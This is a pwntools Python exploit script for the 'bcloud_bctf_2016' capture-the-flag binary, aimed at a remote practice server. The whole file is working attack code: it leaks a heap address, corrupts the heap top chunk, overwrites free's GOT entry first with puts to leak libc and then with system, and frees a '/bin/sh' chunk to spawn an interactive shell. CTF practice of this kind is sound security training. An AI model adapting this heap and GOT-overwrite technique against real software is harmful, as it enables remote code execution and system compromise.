#!/usr/bin/env python
# coding=utf-8
from pwn import *
context.arch = 'i386'


local = 0
if local == 1:
    r=process('./bcloud_bctf_2016')
    gdb.attach(r,"b * 0x8048760")
else:
    r = remote('node4.buuoj.cn',27045)

elf= ELF('./bcloud_bctf_2016')

def add(size,content):
    r.recvuntil('option--->>')
    r.sendline('1')
    r.recvuntil('content:')
    r.sendline(str(size))
    r.recvuntil('content:')
    r.sendline(content)

def edit(index,content):
    r.recvuntil('option--->>')
    r.sendline('3')
    r.recvuntil('id:')
    r.sendline(str(index))
    r.recvuntil('content:')
    r.sendline(content)

def dele(index):
    r.recvuntil('option--->>')
    r.sendline('4')
    r.recvuntil('id:')
    r.sendline(str(index))

free_got = elf.got['free']
puts = elf.symbols['puts']
libc_start_main_got = elf.got['__libc_start_main']


r.recvuntil('name:')
r.send(cyclic(64))
r.recvuntil('paaa')
heap = u32(r.recv(4))
log.success('heap:'+hex(heap))

r.recvuntil('Org:')
r.send('\xff'*4+cyclic(60))
r.recvuntil('Host:')
r.sendline('\xff'*63)

add(0x804b040-heap,'aaaaaaaa')
add(0x68,p32(free_got)+p32(free_got)+p32(elf.got['__libc_start_main'])+p32(0x804b130)+'/bin/sh')

edit(1,p32(puts)+'a')
dele(2)

r.recvuntil("\n")
libc_start_main = u32(r.recv(4))
log.success("libc_start_main:"+hex(libc_start_main))
log.success("setvbuf:"+hex(u32(r.recv(4))))
system = libc_start_main + 	0x22400

edit(1,p32(system))
dele(3)

r.interactive()
